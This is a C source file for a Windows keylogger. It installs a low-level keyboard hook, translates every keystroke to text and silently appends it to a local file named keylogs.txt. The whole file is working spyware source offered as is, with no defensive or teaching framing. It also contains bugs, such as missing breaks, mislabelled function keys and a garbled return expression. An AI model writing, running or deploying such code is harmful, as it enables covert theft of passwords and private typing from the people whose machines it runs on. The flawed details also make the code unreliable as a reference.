#include <Windows.h>
#include <Winuser.h>
#include <stdio.h>

#pragma comment( lib, "user32.lib") 
#pragma comment( lib, "gdi32.lib")

KBDLLHOOKSTRUCT hookInfo;
BOOL capsLock = FALSE;
BOOL shift = FALSE;

const char * translateKeyCode(DWORD virtualKeyCode, BOOL shift, BOOL capsLock) {
	const char * keyCode;

	switch (virtualKeyCode) {

		case 0x41:  keyCode = capsLock ? (shift ? "a" : "A") : (shift ? "A" : "a"); break;
		case 0x42:  keyCode = capsLock ? (shift ? "b" : "B") : (shift ? "B" : "b"); break;
		case 0x43:  keyCode = capsLock ? (shift ? "c" : "C") : (shift ? "C" : "c"); break;
		case 0x44:  keyCode = capsLock ? (shift ? "d" : "D") : (shift ? "D" : "d"); break;
		case 0x45:  keyCode = capsLock ? (shift ? "e" : "E") : (shift ? "E" : "e"); break;
		case 0x46:  keyCode = capsLock ? (shift ? "f" : "F") : (shift ? "F" : "f"); break;
		case 0x47:  keyCode  = capsLock ? (shift ? "g" : "G") : (shift ? "G" : "g"); break;
		case 0x48:  keyCode  = capsLock ? (shift ? "h" : "H") : (shift ? "H" : "h"); break;
		case 0x49:  keyCode  = capsLock ? (shift ? "i" : "I") : (shift ? "I" : "i"); break;
		case 0x4A:  keyCode  = capsLock ? (shift ? "j" : "J") : (shift ? "J" : "j"); break;
		case 0x4B:  keyCode  = capsLock ? (shift ? "k" : "K") : (shift ? "K" : "k"); break;
		case 0x4C:  keyCode  = capsLock ? (shift ? "l" : "L") : (shift ? "L" : "l"); break;
		case 0x4D:  keyCode  = capsLock ? (shift ? "m" : "M") : (shift ? "M" : "m"); break;
		case 0x4E:  keyCode  = capsLock ? (shift ? "n" : "N") : (shift ? "N" : "n"); break;
		case 0x4F:  keyCode  = capsLock ? (shift ? "o" : "O") : (shift ? "O" : "o"); break;
		case 0x50:  keyCode  = capsLock ? (shift ? "p" : "P") : (shift ? "P" : "p"); break;
		case 0x51:  keyCode  = capsLock ? (shift ? "q" : "Q") : (shift ? "Q" : "q"); break;
		case 0x52:  keyCode  = capsLock ? (shift ? "r" : "R") : (shift ? "R" : "r"); break;
		case 0x53:  keyCode  = capsLock ? (shift ? "s" : "S") : (shift ? "S" : "s"); break;
		case 0x54:  keyCode  = capsLock ? (shift ? "t" : "T") : (shift ? "T" : "t"); break;
		case 0x55:  keyCode  = capsLock ? (shift ? "u" : "U") : (shift ? "U" : "u"); break;
		case 0x56:  keyCode  = capsLock ? (shift ? "v" : "V") : (shift ? "V" : "v"); break;
		case 0x57:  keyCode  = capsLock ? (shift ? "w" : "W") : (shift ? "W" : "w"); break;
		case 0x58:  keyCode  = capsLock ? (shift ? "x" : "X") : (shift ? "X" : "x"); break;
		case 0x59:  keyCode  = capsLock ? (shift ? "y" : "Y") : (shift ? "Y" : "y"); break;
		case 0x5A:  keyCode  = capsLock ? (shift ? "z" : "Z") : (shift ? "Z" : "z"); break;
		case VK_SLEEP:  keyCode  = "[SLEEP]"; break;
		case VK_NUMPAD0:  keyCode  = "0"; break;
		case VK_NUMPAD1:  keyCode  = "1"; break;
		case VK_NUMPAD2 :  keyCode  = "2"; break;
		case VK_NUMPAD3:  keyCode  = "3"; break;
		case VK_NUMPAD4:  keyCode  = "4"; break;
		case VK_NUMPAD5:  keyCode  = "5"; break;
		case VK_NUMPAD6:  keyCode  = "6"; break;
		case VK_NUMPAD7:  keyCode  = "7"; break;
		case VK_NUMPAD8:  keyCode  = "8"; break;
		case VK_NUMPAD9:  keyCode  = "9"; break;
		case VK_MULTIPLY:  keyCode  = "*"; break;
		case VK_ADD:  keyCode  = "+"; break;
		case VK_SEPARATOR:  keyCode  = "-"; break;
		case VK_SUBTRACT:  keyCode  = "-"; break;
		case VK_DECIMAL:  keyCode  = "."; break;
		case VK_DIVIDE:  keyCode = "/"; break;
		case VK_F1:  keyCode  = "[F1]"; break;
		case VK_F2:  keyCode  = "[F2]"; break;
		case VK_F3:  keyCode  = "[F3]"; break;
		case VK_F4:  keyCode  = "[F4]"; break;
		case VK_F5:  keyCode  = "[F5]"; break;
		case VK_F6:  keyCode  = "[F6]"; break;
		case VK_F7:  keyCode  = "[F7]"; break;
		case VK_F8:  keyCode  = "[F8]"; break;
		case VK_F9:  keyCode  = "[F9]"; break;
		case VK_F10:  keyCode  = "[F10]"; break;
		case VK_F11:  keyCode  = "[F11]"; break;
		case VK_F12:  keyCode  = "[F12]"; break;
		case VK_F13:  keyCode  = "[F13]"; break;
		case VK_F14:  keyCode  = "[F14]"; break;
		case VK_F15:  keyCode  = "[F15]"; break;
		case VK_F16:  keyCode  = "[F16]"; break;
		case VK_F17:  keyCode  = "[F17]"; break;
		case VK_F18:  keyCode  = "[F18]"; break;
		case VK_F19:  keyCode  = "[F19]"; break;
		case VK_F20:  keyCode  = "[F20]"; break;
		case VK_F21:  keyCode  = "[F22]"; break;
		case VK_F22:  keyCode  = "[F23]"; break;
		case VK_F23:  keyCode  = "[F24]"; break;
		case VK_F24:  keyCode  = "[F25]"; break;
		case VK_NUMLOCK:  keyCode  = "[NUM-LOCK]"; break;
		case VK_SCROLL:  keyCode  = "[SCROLL-LOCK]"; break;
		case VK_BACK:  keyCode  = "[BACK]"; break;
		case VK_TAB:  keyCode  = "[TAB]"; break;
		case VK_CLEAR:  keyCode  = "[CLEAR]"; break;
		case VK_RETURN:  keyCode  = "[ENTER]"; break;
		case VK_SHIFT:  keyCode  = "[SHIFT]"; break;
		case VK_CONTROL:  keyCode  = "[CTRL]"; break;
		case VK_MENU:  keyCode  = "[ALT]"; break;
		case VK_PAUSE:  keyCode  = "[PAUSE]"; break;
		case VK_CAPITAL:  keyCode  = "[CAP-LOCK]"; break;
		case VK_ESCAPE:  keyCode  = "[ESC]"; break;
		case VK_SPACE:  keyCode  = "[SPACE]"; break;
		case VK_PRIOR:  keyCode  = "[PAGEUP]"; break;
		case VK_NEXT:  keyCode  = "[PAGEDOWN]"; break;
		case VK_END:  keyCode  = "[END]"; break;
		case VK_HOME:  keyCode  = "[HOME]"; break;
		case VK_LEFT:  keyCode  = "[LEFT]"; break;
		case VK_UP:  keyCode  = "[UP]"; break;
		case VK_RIGHT:  keyCode  = "[RIGHT]"; break;
		case VK_DOWN:  keyCode  = "[DOWN]"; break;
		case VK_SELECT:  keyCode  = "[SELECT]"; break;
		case VK_PRINT:  keyCode  = "[PRINT]"; break;
		case VK_SNAPSHOT:  keyCode  = "[PRTSCRN]"; break;
		case VK_INSERT:  keyCode  = "[INS]"; break;
		case VK_DELETE:  keyCode  = "[DEL]"; break;
		case VK_HELP:  keyCode  = "[HELP]"; break;
		case 0x30:  keyCode  = shift ? "!" : "1"; break; 
		case 0x31:  keyCode  = shift ? "@" : "2"; break;
		case 0x32:  keyCode  = shift ? "#" : "3"; break;
		case 0x33:  keyCode  = shift ? "$" : "4"; break;
		case 0x34:  keyCode  = shift ? "%" : "5"; break;
		case 0x35:  keyCode  = shift ? "^" : "6"; break;
		case 0x36:  keyCode  = shift ? "&" : "7"; break;
		case 0x37:  keyCode  = shift ? "*" : "8"; break;
		case 0x38:  keyCode  = shift ? "(" : "9"; break;
		case 0x39:  keyCode  = shift ? ")" : "0"; break;
		case VK_LWIN:  keyCode  = "[WIN]"; break;
		case VK_RWIN:  keyCode  = "[WIN]"; break;
		case VK_LSHIFT:  keyCode  = "[SHIFT]"; break;
		case VK_RSHIFT:  keyCode  = "[SHIFT]"; break;
		case VK_LCONTROL:  keyCode  = "[CTRL]"; break;
		case VK_RCONTROL:  keyCode  = "[CTRL]"; break;
		case VK_OEM_1:  keyCode  = shift ? ":" : ";"; break;
		case VK_OEM_PLUS:  keyCode  = shift ? "+" : "="; break;
		case VK_OEM_COMMA:  keyCode  = shift ? "<" : ","; break; 
		case VK_OEM_MINUS:  keyCode  = shift ? "_" : "-"; break;
		case VK_OEM_PERIOD:  keyCode  = shift ? ">" : "."; break;
		case VK_OEM_2:  keyCode  = shift ? "?" : "/"; break;
		case VK_OEM_3:  keyCode  = shift ? "~" : "`"; break;
		case VK_OEM_4:  keyCode  = shift ? "{" : "["; break;
		case VK_OEM_5:  keyCode  = shift ? "\\" : "|"; break;
		case VK_OEM_6:  keyCode  = shift ? "}" : "]"; break;
		case VK_OEM_7:  keyCode  = shift ? "'" : "'"; break;
		case VK_PLAY:  keyCode  = "[PLAY]";
		case VK_ZOOM:  keyCode  = "[ZOOM]";
		case VK_OEM_CLEAR:  keyCode  = "[CLEAR]";
		case VK_CANCEL:  keyCode  = "[CTRL-C]";

		default:  keyCode  = "[UNK-KEY]";break;
	}

	return keyCode + '\0';
}

LRESULT WINAPI CALLBACK keylog(int nCode, WPARAM wParam, LPARAM lParam) {
	DWORD bytesWritten;
	
	if (nCode >= 0) {

		hookInfo = *((KBDLLHOOKSTRUCT*)lParam);
		DWORD keyCode = hookInfo.vkCode;

		if (wParam == WM_KEYUP && (keyCode == VK_SHIFT || keyCode == VK_RSHIFT || keyCode == VK_LSHIFT)) {
			shift = FALSE;
		}

		if (wParam == WM_KEYDOWN) {

			if (keyCode == VK_CAPITAL) {
				switch (capsLock) {
					case FALSE: capsLock = TRUE; break;
					case TRUE: capsLock = FALSE; break;
					default: capsLock = TRUE; break;
				}
			}

			if (keyCode == VK_SHIFT || keyCode == VK_RSHIFT || keyCode == VK_LSHIFT) {
				shift = TRUE;
			}

			const char* key = translateKeyCode(keyCode, shift, capsLock);

			HANDLE logFileHandle = CreateFileA("keylogs.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (logFileHandle != INVALID_HANDLE_VALUE) {
				int status = WriteFile(logFileHandle, key, strlen(key), &bytesWritten, NULL);
				if (status == 0) {
					printf("Failed to Write: %s\n", key);
				}
				CloseHandle(logFileHandle);
			}
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}


int main(int argc, char* argv[]) {
	HHOOK keyloggerHook;
	keyloggerHook = SetWindowsHookEx(WH_KEYBOARD_LL, keylog, NULL, NULL);
	if (keyloggerHook == NULL) {
		printf("[-] Unable to install hook!\n");
		return -1;
	}
	

	//TODO: FIGURE OUT THIS LINE AND WHY THIS IS NECESSARY
	MSG Msg;
	while (GetMessage(&Msg, NULL, 0, 0) > 0) {
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
		

	UnhookWindowsHookEx(keyloggerHook);

	return 0;
}